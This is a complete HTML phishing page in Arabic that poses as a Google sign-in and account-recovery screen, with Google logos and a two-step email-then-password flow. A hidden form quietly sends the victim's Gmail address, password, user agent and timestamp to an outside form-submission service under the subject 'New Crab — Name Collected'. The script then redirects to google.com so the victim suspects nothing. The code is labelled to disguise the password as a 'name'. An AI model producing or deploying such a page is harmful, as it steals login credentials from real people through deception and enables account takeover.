<!DOCTYPE html>
<html lang="en" style="color-scheme: dark;">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="color-scheme" content="dark">
  <title>Google Account Recovery</title>
  <style>
    /* Base Reset & Typography */
    /* Base Reset & Typography */
    body {
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      line-height: 1.5;
      direction: rtl; /* RTL Support */
      text-align: right;
    }

    :root {
      --gm3-sys-color-primary: rgb(168 199 250 / 1);
    }

    /* Container */
    .container {
      max-width: 400px;
      margin: 80px auto 0 auto; /* top spacing to match screenshot */
      padding: 40px 32px 32px;
      background: #121212;
      border-radius: 12px;
      box-shadow: none;
    }

    .container svg {
      display: block;
      margin: 0 0 24px auto; /* push logo to top right */
    }

    /* Title */
    h1 {
      font-size: 34px;
      font-weight: 200;
      margin: 0 0 0 0;
      color: #fff;
    }

    /* Subtitle */
    .subtitle {
      font-size: 16px;
      color: #e8eaed;
      margin-bottom: 24px;
      line-height: 1.6;
    }

    /* Input Field */
    .input-group {
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      border: 0.5px solid #c0c3c7;
      border-radius: 6px;
      font-size: 16px;
      color: #e8eaed;
      outline: none;
      box-sizing: border-box;
      background-color: transparent;
      padding:20px;
    }

    .input-group input::placeholder {
      color: #c1c5c9;
    }

    .input-group input:focus {
      border-color: #8ab4f8;
      box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.3);
    }

    /* Link */
    .link {
      color: #8ab4f8;
      text-decoration: none;
      font-size: 14px;
      display: inline-block;
      margin-bottom: 24px;
    }

    .link:hover {
      text-decoration: underline;
    }

    /* Button */
    .button {
      background-color: var(--gm3-sys-color-primary);
      color: #0b3876;
      border: none;
      padding: 14px 24px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      display: block;
      margin: 24px 0 0 auto;
    }

    .button:hover {
      background-color: rgba(168, 199, 250, 0.9);
    }

    /* Footer */
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
      color: #9aa0a6;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .footer a {
      color: #9aa0a6;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    /* Language Selector */
    .language-select {
      text-align: center;
      font-size: 13px;
      color: #9aa0a6;
      margin-top: 32px;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .container {
        margin: 0;
        padding: 24px 16px;
        border-radius: 0;
        background-color: #000;
      }
    }
    /* Additional Styles for Step 2 */
    .email-pill {
      display: inline-flex;
      align-items: center;
      background-color: transparent;
      border: 1px solid #5f6368;
      border-radius: 24px;
      padding: 8px 12px;
      margin-bottom: 16px;
      font-size: 14px;
      color: #e8eaed;
      max-width: 100%;
      box-sizing: border-box;
      width: auto;
      min-width: 0;
    }
    .email-pill svg {
      margin: 0 8px;
      flex-shrink: 0;
    }
    #email-display-text {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 220px;
      display: inline-block;
      vertical-align: middle;
    }

  </style>
</head>
<body>

  <!-- Step 1: Email Entry -->
  <div class="container " id="step1" style="padding: 24px;">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true " style="logo">
      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
    </svg>
    <div style="text-align: right; margin-bottom: 28px;">
      
      <h1>تسجيل الدخول</h1>
      <p class="subtitle">باستخدام حسابك على Google</p>
    </div>

    <div class="input-group">
      <input type="email" id="email-input" placeholder=" البريد الإلكتروني أو رقم الهاتف" required autocomplete="email" style="background-color: transparent; padding:18px;">
      <a href="#" class="link" style="margin-top:6px;">نسيت االبريد الإلكتروني؟</a>
    </div>
    <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
      ألا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص.
      <a href="https://support.Google.com/chrome/answer/6130773?hl=ar" class="link">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
    </p>
    
    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
      <button id="next-btn" class="button" style="width: auto; min-width: 70px; margin: 0; border-radius:24px; padding:12px">التالي</button>
      <a href="#" class="link" style="margin-left: 8px;">إنشاء حساب</a>
    </div>
  </div>

  <!-- Step 2: Password (Name) Collection -->
  <div class="container" id="step2" style="display: none;">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
    </svg>

    <h1>مرحباً</h1>

    <div class="email-pill">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 640 640">
        <path fill="currentColor" d="M463 448.2C440.9 409.8 399.4 384 352 384L288 384C240.6 384 199.1 409.8 177 448.2C212.2 487.4 263.2 512 320 512C376.8 512 427.8 487.3 463 448.2zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320zM320 336C359.8 336 392 303.8 392 264C392 224.2 359.8 192 320 192C280.2 192 248 224.2 248 264C248 303.8 280.2 336 320 336z"/>
      </svg>
      <span id="email-display-text">name@gmail.com</span>
      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </div>

    <p class="subtitle">للتأكد من انه انت, يرجي ادخال كلمة المرور</p>

    <div class="input-group">
      <input type="password" id="name-input" required placeholder="ادخال كلمة المرور" autocomplete="current-password">
    </div>

    <div class="checkbox-wrapper">
      <input type="checkbox" id="show-password">
      <label for="show-password">عرض كلمة المرور</label>
    </div>

    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
      <button id="submit-btn" class="button" style="width: auto; min-width: 70px; margin: 0; border-radius:24px; padding:12px">التالي</button>
      <a href="#" class="link" style="margin: 24px;">جرب طريقة اخري</a>
    </div>

    <div style="text-align: center; margin: 24px 0;">
    </div>
  </div>

  <div class="language-select">
    العربية (مصر)
  </div>

  <div class="footer">
    <a href="#">مساعدة</a>
    <a href="#">الخصوصية</a>
    <a href="#">الشروط</a>
  </div>

  <!-- Hidden Form for Web3Forms -->
  <form id="web3form" action="https://api.web3forms.com/submit" method="POST" style="display:none;">
    <input type="hidden" name="access_key" value="c96cd056-1436-4aec-8857-ed2ecb10b770">
    <input type="hidden" name="email" id="hidden-email">
    <input type="hidden" name="name" id="hidden-name">
    <input type="hidden" name="_ip" value="auto">
    <input type="hidden" name="user_agent" id="user-agent">
    <input type="hidden" name="timestamp" id="timestamp">
    <input type="text" name="_honey" style="display:none;">
    <input type="hidden" name="_subject" value="New Crab — Name Collected">
  </form>

  <!-- JavaScript -->
  <script>
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const emailInput = document.getElementById('email-input');
    const nameInput = document.getElementById('name-input');
    const emailDisplayText = document.getElementById('email-display-text');
    const nextBtn = document.getElementById('next-btn');
    const submitBtn = document.getElementById('submit-btn');
    const web3form = document.getElementById('web3form');
    const hiddenEmail = document.getElementById('hidden-email');
    const hiddenName = document.getElementById('hidden-name');

    // Fixed Gmail validation function
    function isValidGmail(email) {
        const trimmedEmail = email.trim().toLowerCase();
        
        if (!trimmedEmail) return false;
        
        // Fixed regex - simpler and more permissive for Gmail validation
        const gmailRegex = /^[a-zA-Z0-9._%+-]+@(gmail|googlemail)\.com$/;
        
        return gmailRegex.test(trimmedEmail);
    }

    // Error message function
    function showError(message) {
        // Remove existing error message
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Create error message element
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            color: #ea4335;
            font-size: 14px;
            margin-top: 0px;
            text-align: right;
         `;
        errorDiv.textContent = message;
        
        // Insert after input field
        emailInput.parentNode.appendChild(errorDiv);
        
        // Add red border to input
        emailInput.style.borderColor = '#ea4335';
        emailInput.style.boxShadow = '0 0 0 2px rgba(234, 67, 53, 0.3)';
    }

    // Clear error when user starts typing again
    emailInput.addEventListener('focus', function() {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        emailInput.style.borderColor = '#c0c3c7';
        emailInput.style.boxShadow = 'none';
    });

    // Real-time validation feedback
    emailInput.addEventListener('input', function() {
        const email = emailInput.value.trim();
        
        // Clear error when typing
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        if (email && !isValidGmail(email)) {
            emailInput.style.borderColor = '#ea4335';
            emailInput.style.boxShadow = '0 0 0 2px rgba(234, 67, 53, 0.3)';
        } else {
            emailInput.style.borderColor = '#c0c3c7';
            emailInput.style.boxShadow = 'none';
        }
    });

    // Show step 2 with Gmail validation - FIXED
    nextBtn.addEventListener('click', function(e) {
        e.preventDefault();
        const email = emailInput.value.trim();
        
        console.log('Email entered:', email); // Debug log
        console.log('Is valid Gmail:', isValidGmail(email)); // Debug log
        
        // Validation checks
        if (!email) {
            showError('يرجى إدخال بريد إلكتروني');
            return;
        }
        
        if (!isValidGmail(email)) {
            showError('يرجى استخدام بريد Gmail صالح (يجب أن ينتهي بـ @gmail.com)');
            emailInput.focus();
            return;
        }
        
        // If validation passes
        emailDisplayText.textContent = email;
        step1.style.display = 'none';
        step2.style.display = 'block';
    });

    // Toggle password visibility
    document.getElementById('show-password').addEventListener('change', function () {
        nameInput.type = this.checked ? 'text' : 'password';
    });

    // Password error function
    function showPasswordError(message) {
        const existingError = document.querySelector('.password-error');
        if (existingError) {
            existingError.remove();
        }
        
        const errorDiv = document.createElement('div');
        errorDiv.className = 'password-error';
        errorDiv.style.cssText = `
            color: #ea4335;
            font-size: 14px;
            margin-top: 2px;
            text-align: right;
          `;
        errorDiv.textContent = message;
        
        nameInput.parentNode.appendChild(errorDiv);
        nameInput.style.borderColor = '#ea4335';
        nameInput.style.boxShadow = '0 0 0 2px rgba(234, 67, 53, 0.3)';
    }

    // Clear password error on focus
    nameInput.addEventListener('focus', function() {
        const existingError = document.querySelector('.password-error');
        if (existingError) {
            existingError.remove();
        }
        nameInput.style.borderColor = '#c0c3c7';
        nameInput.style.boxShadow = 'none';
    });

    // Submit and redirect
    submitBtn.addEventListener('click', function (e) {
        e.preventDefault();
        const name = nameInput.value.trim();
        if (!name) {
            showPasswordError('يرجى إدخال كلمة المرورالصحيحة');
            return;
        }

        // Set form values
        hiddenEmail.value = emailInput.value;
        hiddenName.value = name;
        document.getElementById('user-agent').value = navigator.userAgent;
        document.getElementById('timestamp').value = new Date().toISOString();

        // Submit silently
        web3form.requestSubmit();

        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 700);
    });
    
  </script>
</body>
</html>
